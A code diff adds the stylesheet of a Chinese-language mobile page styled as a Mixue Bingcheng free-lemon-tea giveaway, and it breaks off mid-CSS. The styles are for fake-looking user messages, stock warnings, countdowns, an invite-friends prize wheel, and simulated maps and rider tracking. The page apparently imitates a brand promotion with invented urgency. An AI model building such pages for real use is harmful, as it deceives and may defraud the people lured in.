@@ -1,0 +1,2909 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta name="format-detection" content="telephone=no"/>
+  <title>蜜雪冰城 · 限时福利 · 免费领柠檬茶</title>
+  <style>
+    :root {
+      --mixue-red: #E63946;
+      --mixue-yellow: #FFD166;
+      --mixue-white: #F8F9FA;
+      --mixue-dark: #252422;
+      --mixue-gray: #CCC5B9;
+      --shadow-light: 0 8px 32px rgba(230, 57, 70, 0.25);
+      --radius-lg: 28px;
+      --radius-md: 18px;
+      --radius-sm: 12px;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+      background: linear-gradient(135deg, #ff6b6b 0%, #feca57 50%, #ff9ff3 100%);
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 20px 15px;
+      position: relative;
+      overflow-x: hidden;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(10px);
+      z-index: -1;
+    }
+
+    /* 启动加载画面 */
+    .splash-screen {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 999999;
+      transition: opacity 0.5s ease-out;
+    }
+    .splash-screen.hide {
+      opacity: 0;
+      pointer-events: none;
+    }
+    .splash-logo {
+      width: 120px;
+      height: 120px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 60px;
+      margin-bottom: 30px;
+      animation: bounce 1s infinite;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+    .splash-text {
+      color: white;
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 20px;
+      letter-spacing: 2px;
+    }
+    .splash-progress {
+      width: 200px;
+      height: 6px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .splash-progress-bar {
+      height: 100%;
+      background: var(--mixue-yellow);
+      width: 0%;
+      transition: width 0.1s linear;
+      border-radius: 3px;
+    }
+    .splash-hint {
+      color: rgba(255,255,255,0.8);
+      font-size: 0.9rem;
+      margin-top: 15px;
+    }
+
+    .card { width:100%; max-width:420px; background:rgba(255,255,255,0.98); border-radius:var(--radius-lg); overflow:hidden; box-shadow:var(--shadow-light); border:1px solid rgba(230,57,70,0.1); animation:fadeUp 0.6s ease-out; margin-top: 10px; }
+    @keyframes fadeUp { 0% {opacity:0; transform:translateY(30px);} 100% {opacity:1; transform:translateY(0);} }
+
+    .header { background:linear-gradient(135deg, var(--mixue-red), #C92A39); color:var(--mixue-white); padding:32px 20px 20px; text-align:center; position:relative; }
+    .header::after { content:""; position:absolute; bottom:0; left:0; right:0; height:6px; background:var(--mixue-yellow); }
+    .header h1 { font-size:2.2rem; font-weight:900; letter-spacing:2px; text-shadow:0 2px 4px rgba(0,0,0,0.1); }
+    .header p { margin:8px 0 12px; font-size:1rem; font-weight:500; opacity:0.95; }
+
+    .activity-period { font-size:0.8rem; background:rgba(255,255,255,0.15); padding:8px 16px; border-radius:50px; display:inline-block; margin:6px 0 12px; }
+    #globalTimer { color:var(--mixue-yellow); font-weight:700; display:block; margin-top:6px; }
+
+    .stock-info { font-size:0.9rem; background:rgba(0,0,0,0.2); padding:8px 16px; border-radius:50px; margin:10px auto; max-width:95%; font-weight:600; }
+    .low-stock { color:var(--mixue-yellow) !important; animation:blinkWarn 1s infinite alternate; }
+    @keyframes blinkWarn { from {opacity:1;} to {opacity:0.7;} }
+
+    .join-count { text-align:center; font-size:1.1rem; color:var(--mixue-red); background:rgba(255,209,102,0.15); padding:10px; margin:0; font-weight:700; animation:pulse 2.5s infinite; }
+    @keyframes pulse { 0%,100% {transform:scale(1);} 50% {transform:scale(1.03);} }
+
+    .content { padding:24px 20px 32px; background:var(--mixue-white); }
+
+    .barrage-box { 
+      height: 50px;
+      margin:0 0 16px; 
+      background:rgba(230,57,70,0.05); 
+      border-radius:var(--radius-sm); 
+      overflow:hidden; 
+      position:relative; 
+      border:1px solid rgba(230,57,70,0.1); 
+    }
+    .barrage-item { 
+      position:absolute; 
+      white-space:nowrap; 
+      font-size:0.75rem; 
+      font-weight:600; 
+      padding:4px 10px; 
+      line-height:1.2; 
+      left:100%; 
+      background:rgba(255,255,255,0.94); 
+      border-radius:10px; 
+      box-shadow:0 1px 3px rgba(0,0,0,0.07); 
+      z-index:1; 
+      animation:barrageSlide linear forwards; 
+      will-change: transform;
+      pointer-events: none;
+    }
+    @keyframes barrageSlide { 
+      0% { transform:translateX(0); } 
+      100% { transform:translateX(calc(-100vw - 140%)); } 
+    }
+
+    .input-box { position:relative; margin-bottom:12px; }
+    input { width:100%; height:52px; padding:0 20px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
+    input:focus { outline:none; border-color:var(--mixue-red); box-shadow:0 0 0 4px rgba(230,57,70,0.1); transform:translateY(-2px); }
+    input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 4px rgba(255,77,79,0.1); animation:shake 0.3s; }
+    @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }
+
+    .verify-slider {
+      width: 100%;
+      height: 50px;
+      background: #f0f2f5;
+      border-radius: 25px;
+      position: relative;
+      margin: 0 0 12px 0;
+      overflow: hidden;
+      border: 1px solid #e8eaed;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
+      opacity: 0;
+      max-height: 0;
+      transform: translateY(-10px);
+      transition: all 0.3s ease;
+      pointer-events: none;
+    }
+
+    .verify-slider.show {
+      opacity: 1;
+      max-height: 50px;
+      transform: translateY(0);
+      pointer-events: auto;
+      margin: 0 0 12px 0;
+    }
+
+    .verify-bg {
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      background: linear-gradient(90deg, #ffd166, #ffbd59);
+      width: 0;
+      transition: width 0.15s ease;
+      border-radius: 25px 0 0 25px;
+    }
+
+    .verify-success .verify-bg {
+      background: linear-gradient(90deg, #52c41a, #73d13d);
+      border-radius: 25px;
+    }
+
+    .verify-block {
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 50px;
+      height: 50px;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      font-weight: bold;
+      color: #666;
+      cursor: grab;
+      transition: all 0.2s ease;
+      z-index: 2;
+      user-select: none;
+    }
+
+    .verify-block:active {
+      cursor: grabbing;
+      transform: scale(1.08);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.22);
+    }
+
+    .verify-success .verify-block {
+      background: #52c41a;
+      color: white;
+      box-shadow: 0 4px 16px rgba(82,196,26,0.4);
+    }
+
+    .verify-text {
+      position: absolute;
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8c8c8c;
+      font-size: 0.9rem;
+      font-weight: 500;
+      pointer-events: none;
+      z-index: 1;
+      transition: color 0.3s;
+    }
+
+    .verify-success .verify-text {
+      color: #52c41a;
+      font-weight: 600;
+    }
+
+    .btn { width:100%; height:52px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.1rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:12px; box-shadow:0 4px 12px rgba(230,57,70,0.3); position: relative; overflow: hidden; }
+    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; opacity:0.7; }
+    .btn::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.3);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+    .btn:active::after {
+      width: 300px;
+      height: 300px;
+    }
+
+    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.98); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(8px); }
+    .loading-mask.show { display:flex; }
+    .loading-spinner { width:50px; height:50px; border:4px solid #f3f3f3; border-top:4px solid var(--mixue-red); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:20px; }
+    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+    
+    .loading-title { 
+      font-size:1.3rem; 
+      color:var(--mixue-red); 
+      font-weight:700; 
+      margin-bottom:10px;
+      animation:pulse 2s infinite;
+    }
+    .loading-subtitle { 
+      font-size:0.9rem; 
+      color:#666; 
+      font-weight:500; 
+      text-align:center;
+      padding:0 30px;
+      line-height:1.5;
+    }
+    .loading-hint {
+      position:absolute;
+      bottom:30px;
+      font-size:0.8rem;
+      color:#999;
+      text-align:center;
+      padding:0 20px;
+    }
+
+    .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; padding: 20px; }
+    .modal.show { display:flex; }
+    .modal-content { background:#fff; border-radius:var(--radius-lg); padding:32px 24px; text-align:center; max-width:340px; width:100%; box-shadow:var(--shadow-light); position: relative; overflow: hidden; max-height: 90vh; overflow-y: auto; }
+    .modal-content h2 { color:var(--mixue-red); margin-bottom:12px; font-size:1.6rem; }
+    .coupon-code { background:var(--mixue-yellow); color:var(--mixue-dark); padding:10px 16px; border-radius:var(--radius-sm); font-weight:bold; margin:12px 0; letter-spacing:1px; font-size: 1rem; word-break: break-all; }
+    .modal-emoji { font-size:2rem; margin:12px 0; }
+
+    .toast-container { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:999999; display:flex; flex-direction:column; gap:8px; width: 90%; max-width: 400px; }
+    .toast { background:rgba(0,0,0,0.8); color:#fff; padding:12px 20px; border-radius:25px; font-size:0.9rem; animation:toastIn 0.3s ease-out; text-align: center; backdrop-filter: blur(10px); }
+    @keyframes toastIn { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+
+    .agreement {
+      text-align: center;
+      font-size: 0.75rem;
+      color: #666;
+      margin-top: 12px;
+      line-height: 1.4;
+    }
+    .agreement a {
+      color: var(--mixue-red);
+      text-decoration: none;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .rejected-modal .modal-content {
+      border: 3px solid #ff4d4f;
+    }
+    .rejected-modal h2 {
+      color: #ff4d4f;
+    }
+
+    /* 邀请好友页面样式 */
+    .invite-page {
+      display: none;
+      padding: 16px;
+      text-align: center;
+    }
+    .invite-page.show {
+      display: block;
+    }
+    .invite-header {
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      color: white;
+      padding: 24px 16px;
+      border-radius: var(--radius-lg);
+      margin-bottom: 16px;
+      position: relative;
+      overflow: hidden;
+    }
+    .invite-header::before {
+      content: '❄';
+      position: absolute;
+      font-size: 100px;
+      opacity: 0.1;
+      top: -20px;
+      right: -20px;
+      animation: rotate 10s linear infinite;
+    }
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    .invite-header h2 {
+      font-size: 1.3rem;
+      margin-bottom: 8px;
+    }
+    .invite-progress {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      margin: 16px 0;
+    }
+    .invite-step {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 0.9rem;
+      transition: all 0.3s;
+      position: relative;
+    }
+    .invite-step.active {
+      background: var(--mixue-yellow);
+      color: var(--mixue-dark);
+      transform: scale(1.1);
+      animation: glow 1.5s infinite;
+    }
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 5px var(--mixue-yellow); }
+      50% { box-shadow: 0 0 15px var(--mixue-yellow); }
+    }
+    .invite-step.completed {
+      background: #52c41a;
+      color: white;
+    }
+    .invite-line {
+      width: 24px;
+      height: 3px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 2px;
+    }
+    .invite-line.completed {
+      background: #52c41a;
+    }
+    .invite-stats {
+      background: white;
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+      position: relative;
+    }
+    .invite-count {
+      font-size: 2.5rem;
+      color: var(--mixue-red);
+      font-weight: 900;
+    }
+    .invite-label {
+      color: #666;
+      font-size: 0.85rem;
+    }
+    .chance-count {
+      margin-top: 8px;
+      font-size: 1rem;
+      color: var(--mixue-yellow);
+      font-weight: 700;
+    }
+    .bonus-tag {
+      position: absolute;
+      top: -8px;
+      right: 8px;
+      background: linear-gradient(135deg, #ff4d4f, #ff7875);
+      color: white;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      animation: shake 2s infinite;
+    }
+
+    /* 倒计时红包 */
+    .countdown-bonus {
+      background: linear-gradient(135deg, #fff7e6, #fff1b8);
+      border: 2px dashed #ffa940;
+      border-radius: var(--radius-sm);
+      padding: 10px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .countdown-bonus .label {
+      color: #d46b08;
+      font-weight: 700;
+      font-size: 0.85rem;
+    }
+    .countdown-bonus .timer {
+      color: #cf1322;
+      font-weight: 900;
+      font-size: 1rem;
+      font-family: monospace;
+    }
+
+    /* 排行榜 */
+    .leaderboard {
+      background: rgba(230,57,70,0.05);
+      border-radius: var(--radius-sm);
+      padding: 12px;
+      margin-bottom: 12px;
+      text-align: left;
+    }
+    .leaderboard h4 {
+      color: var(--mixue-red);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.95rem;
+    }
+    .leaderboard-item {
+      display: flex;
+      align-items: center;
+      padding: 6px 0;
+      border-bottom: 1px dashed rgba(0,0,0,0.1);
+      font-size: 0.8rem;
+    }
+    .leaderboard-item:last-child {
+      border-bottom: none;
+    }
+    .leaderboard-rank {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 0.7rem;
+      margin-right: 8px;
+    }
+    .rank-1 { background: gold; color: #8B4513; }
+    .rank-2 { background: silver; color: #666; }
+    .rank-3 { background: #CD7F32; color: white; }
+    .rank-other { background: #f0f0f0; color: #999; }
+    .leaderboard-name { flex: 1; color: #333; }
+    .leaderboard-count { color: var(--mixue-red); font-weight: 700; }
+
+    /* 转盘样式 */
+    .wheel-container {
+      position: relative;
+      width: 260px;
+      height: 260px;
+      margin: 16px auto;
+    }
+    .wheel {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      position: relative;
+      overflow: hidden;
+      border: 6px solid var(--mixue-red);
+      box-shadow: 0 8px 25px rgba(230,57,70,0.3), inset 0 0 20px rgba(0,0,0,0.05);
+      transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+      background: white;
+    }
+    .wheel-item {
+      position: absolute;
+      width: 50%;
+      height: 50%;
+      transform-origin: right bottom;
+      left: 0;
+      top: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 20px;
+      padding-right: 35px;
+      font-weight: 700;
+      clip-path: polygon(0 0, 100% 0, 100% 100%);
+    }
+    .wheel-item:nth-child(1) { transform: rotate(0deg); background: #FFF2F0; color: #CF1322; }
+    .wheel-item:nth-child(2) { transform: rotate(45deg); background: #FFF7E6; color: #D46B08; }
+    .wheel-item:nth-child(3) { transform: rotate(90deg); background: #F6FFED; color: #389E0D; }
+    .wheel-item:nth-child(4) { transform: rotate(135deg); background: #E6FFFB; color: #08979C; }
+    .wheel-item:nth-child(5) { transform: rotate(180deg); background: #F9F0FF; color: #722ED1; }
+    .wheel-item:nth-child(6) { transform: rotate(225deg); background: #FFF0F6; color: #EB2F96; }
+    .wheel-item:nth-child(7) { transform: rotate(270deg); background: #FFF2E8; color: #FA541C; }
+    .wheel-item:nth-child(8) { transform: rotate(315deg); background: #FCFFE6; color: #7CB305; }
+    
+    .wheel-item .emoji {
+      font-size: 1.5rem;
+      margin-bottom: 4px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+    }
+    .wheel-item .text {
+      font-size: 0.65rem;
+      line-height: 1.2;
+      text-align: center;
+      max-width: 50px;
+    }
+    
+    .wheel-pointer {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 50px;
+      height: 50px;
+      background: var(--mixue-red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      color: white;
+      box-shadow: 0 4px 15px rgba(230,57,70,0.4), 0 0 0 4px white, 0 0 0 8px rgba(230,57,70,0.2);
+      z-index: 10;
+      animation: pointerPulse 2s infinite;
+    }
+    @keyframes pointerPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.05); }
+    }
+    .wheel-pointer::before {
+      content: '';
+      position: absolute;
+      top: -15px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-left: 12px solid transparent;
+      border-right: 12px solid transparent;
+      border-bottom: 20px solid var(--mixue-red);
+    }
+
+    .wheel-btn {
+      background: linear-gradient(135deg, #52c41a, #73d13d);
+      margin-top: 16px;
+      animation: btnPulse 2s infinite;
+    }
+    @keyframes btnPulse {
+      0%, 100% { box-shadow: 0 4px 12px rgba(82,196,26,0.3); }
+      50% { box-shadow: 0 4px 20px rgba(82,196,26,0.5); }
+    }
+    .wheel-btn:disabled {
+      background: var(--mixue-gray);
+      animation: none;
+    }
+
+    .invite-more-btn {
+      background: linear-gradient(135deg, #FA541C, #FF7A45);
+      margin-top: 16px;
+    }
+
+    .redeem-box {
+      display: flex;
+      gap: 8px;
+      margin-top: 16px;
+      align-items: center;
+      background: rgba(230,57,70,0.05);
+      padding: 12px;
+      border-radius: var(--radius-sm);
+      border: 2px dashed rgba(230,57,70,0.2);
+    }
+    .redeem-box .input-box {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    .redeem-box input {
+      height: 44px;
+      font-size: 1rem;
+      text-align: center;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      font-weight: 700;
+      color: var(--mixue-red);
+    }
+    .redeem-btn {
+      width: 70px;
+      height: 44px;
+      background: linear-gradient(135deg, var(--mixue-red), #D62E3D);
+      color: white;
+      border: none;
+      border-radius: var(--radius-sm);
+      font-size: 0.9rem;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(230,57,70,0.3);
+    }
+
+    .invite-rules {
+      background: rgba(230,57,70,0.05);
+      border-radius: var(--radius-sm);
+      padding: 12px;
+      margin-top: 16px;
+      text-align: left;
+      font-size: 0.8rem;
+      color: #666;
+    }
+    .invite-rules h4 {
+      color: var(--mixue-red);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.9rem;
+    }
+    .invite-rules li {
+      margin: 4px 0;
+      list-style: none;
+      padding-left: 12px;
+      position: relative;
+    }
+    .invite-rules li::before {
+      content: '•';
+      color: var(--mixue-red);
+      position: absolute;
+      left: 0;
+      font-weight: 900;
+    }
+
+    .check-in-btn {
+      background: linear-gradient(135deg, #722ED1, #9254DE);
+      margin-top: 8px;
+      font-size: 0.95rem;
+      height: 48px;
+    }
+
+    .particle {
+      position: fixed;
+      pointer-events: none;
+      z-index: 999999;
+      animation: particleFloat 3s ease-out forwards;
+    }
+    @keyframes particleFloat {
+      0% {
+        opacity: 1;
+        transform: translate(0, 0) rotate(0deg) scale(1);
+      }
+      100% {
+        opacity: 0;
+        transform: translate(var(--tx), var(--ty)) rotate(720deg) scale(0);
+      }
+    }
+
+    .cheat-warning {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: #ff4d4f;
+      color: white;
+      text-align: center;
+      padding: 10px;
+      font-weight: 700;
+      z-index: 9999999;
+      display: none;
+      font-size: 0.9rem;
+    }
+    .cheat-warning.show {
+      display: block;
+      animation: slideDown 0.3s ease-out;
+    }
+    @keyframes slideDown {
+      from { transform: translateY(-100%); }
+      to { transform: translateY(0); }
+    }
+
+    .keyboard-hint {
+      position: fixed;
+      bottom: 100px;
+      right: 20px;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      padding: 8px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      opacity: 0;
+      transition: opacity 0.3s;
+      z-index: 100;
+    }
+    .keyboard-hint.show {
+      opacity: 1;
+    }
+
+    .hidden { display: none !important; }
+
+    .copy-btn, .share-btn, .history-btn {
+      margin-top: 10px;
+      background: linear-gradient(135deg, #13c2c2, #36cfc9);
+      height: 48px;
+      font-size: 1rem;
+    }
+    .history-list {
+      max-height: 200px;
+      overflow-y: auto;
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 12px;
+      margin: 12px 0;
+      font-size: 0.9rem;
+      color: #333;
+      text-align: left;
+    }
+    .history-item {
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+    .history-item:last-child { border-bottom: none; }
+
+    /* 门店相关样式 */
+    .store-section {
+      background: white;
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+    }
+    .store-section h4 {
+      color: var(--mixue-red);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 1rem;
+    }
+    .store-list {
+      max-height: 280px;
+      overflow-y: auto;
+    }
+    .store-item {
+      display: flex;
+      align-items: flex-start;
+      padding: 10px;
+      border-bottom: 1px solid #f0f0f0;
+      cursor: pointer;
+      transition: all 0.3s;
+      border-radius: 8px;
+      margin-bottom: 6px;
+    }
+    .store-item:hover {
+      background: rgba(230,57,70,0.05);
+    }
+    .store-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+    }
+    .store-icon {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      margin-right: 10px;
+      flex-shrink: 0;
+    }
+    .store-info {
+      flex: 1;
+      text-align: left;
+    }
+    .store-name {
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 3px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.9rem;
+    }
+    .store-address {
+      font-size: 0.8rem;
+      color: #666;
+      margin-bottom: 3px;
+    }
+    .store-distance {
+      font-size: 0.75rem;
+      color: var(--mixue-red);
+      font-weight: 600;
+    }
+    .store-actions {
+      display: flex;
+      gap: 6px;
+      margin-top: 6px;
+    }
+    .store-btn {
+      padding: 5px 10px;
+      border-radius: 15px;
+      border: none;
+      font-size: 0.7rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .nav-btn {
+      background: linear-gradient(135deg, #1890ff, #36cfc9);
+      color: white;
+    }
+    .delivery-btn {
+      background: linear-gradient(135deg, #52c41a, #73d13d);
+      color: white;
+    }
+
+    .location-loading {
+      text-align: center;
+      padding: 20px;
+      color: #999;
+      font-size: 0.9rem;
+    }
+
+    .delivery-options {
+      display: flex;
+      gap: 10px;
+      margin: 12px 0;
+    }
+    .delivery-option {
+      flex: 1;
+      padding: 12px;
+      border: 2px solid #e8e8e8;
+      border-radius: 12px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .delivery-option.selected {
+      border-color: var(--mixue-red);
+      background: rgba(230,57,70,0.1);
+    }
+    .delivery-option-icon {
+      font-size: 1.8rem;
+      margin-bottom: 4px;
+    }
+    .delivery-option-title {
+      font-weight: 700;
+      color: #333;
+      font-size: 0.85rem;
+    }
+    .delivery-option-desc {
+      font-size: 0.7rem;
+      color: #666;
+    }
+
+    .page-tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+      background: white;
+      padding: 4px;
+      border-radius: 25px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .page-tab {
+      flex: 1;
+      padding: 8px;
+      border-radius: 20px;
+      border: none;
+      background: transparent;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      color: #666;
+      font-size: 0.85rem;
+    }
+    .page-tab.active {
+      background: var(--mixue-red);
+      color: white;
+    }
+
+    /* 雪王客服悬浮按钮 */
+    .chat-float-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 56px;
+      height: 56px;
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(230,57,70,0.4);
+      z-index: 9999;
+      transition: all 0.3s;
+      border: 3px solid white;
+      animation: floatBtnPulse 2s infinite;
+    }
+    .chat-float-btn:hover {
+      transform: scale(1.1);
+    }
+    @keyframes floatBtnPulse {
+      0%, 100% { box-shadow: 0 4px 15px rgba(230,57,70,0.4); }
+      50% { box-shadow: 0 4px 25px rgba(230,57,70,0.7); }
+    }
+    .notification-badge {
+      position: absolute;
+      top: -5px;
+      right: -5px;
+      width: 18px;
+      height: 18px;
+      background: #ff4d4f;
+      border-radius: 50%;
+      font-size: 11px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      animation: badgePulse 1.5s infinite;
+    }
+    @keyframes badgePulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
+    }
+
+    /* 骑手弹窗 */
+    .rider-modal .modal-content {
+      max-width: 340px;
+      padding: 24px 20px;
+    }
+    .rider-info {
+      background: linear-gradient(135deg, #f6ffed, #d9f7be);
+      border-radius: 12px;
+      padding: 16px;
+      margin: 12px 0;
+    }
+    .rider-avatar {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #52c41a, #73d13d);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      margin: 0 auto 8px;
+    }
+    .rider-name {
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 4px;
+    }
+    .rider-id {
+      text-align: center;
+      color: #666;
+      font-size: 0.8rem;
+      margin-bottom: 12px;
+    }
+    .rider-stats {
+      display: flex;
+      justify-content: space-around;
+    }
+    .rider-stat-value {
+      font-weight: 700;
+      color: var(--mixue-red);
+      font-size: 1.1rem;
+    }
+    .rider-stat-label {
+      font-size: 0.7rem;
+      color: #666;
+    }
+    .delivery-map {
+      height: 120px;
+      background: linear-gradient(135deg, #e6f7ff, #bae7ff);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 12px 0;
+      position: relative;
+      overflow: hidden;
+    }
+    .map-route {
+      position: absolute;
+      width: 80%;
+      height: 4px;
+      background: #1890ff;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    .rider-marker {
+      position: absolute;
+      font-size: 24px;
+      animation: riderMove 3s infinite;
+    }
+    @keyframes riderMove {
+      0%, 100% { left: 10%; }
+      50% { left: 70%; }
+    }
+    .progress-line {
+      display: flex;
+      justify-content: space-between;
+      position: relative;
+      margin: 16px 0;
+    }
+    .progress-line::before {
+      content: '';
+      position: absolute;
+      top: 15px;
+      left: 10%;
+      right: 10%;
+      height: 2px;
+      background: #e8e8e8;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 1;
+    }
+    .step-dot {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: #e8e8e8;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      margin-bottom: 4px;
+    }
+    .step-dot.active {
+      background: var(--mixue-red);
+      color: white;
+    }
+    .step-dot.completed {
+      background: #52c41a;
+      color: white;
+    }
+    .eta-box {
+      background: var(--mixue-yellow);
+      padding: 10px;
+      border-radius: 8px;
+      font-weight: 700;
+      margin-top: 12px;
+      font-size: 0.9rem;
+    }
+
+    /* 导航弹窗 */
+    .nav-modal .modal-content {
+      max-width: 360px;
+      padding: 0;
+    }
+    .nav-header {
+      background: linear-gradient(135deg, #1890ff, #36cfc9);
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    .nav-header h3 {
+      margin: 0;
+      font-size: 1.2rem;
+    }
+    .nav-map-container {
+      height: 180px;
+      background: #f0f2f5;
+      position: relative;
+    }
+    .fake-map {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      background: linear-gradient(135deg, #e6f7ff 0%, #bae7ff 100%);
+    }
+    .fake-road {
+      position: absolute;
+      background: white;
+    }
+    .fake-road-h {
+      height: 16px;
+      width: 100%;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    .fake-road-v {
+      width: 16px;
+      height: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .nav-route-line {
+      position: absolute;
+      top: 50%;
+      left: 20%;
+      right: 20%;
+      height: 4px;
+      background: #1890ff;
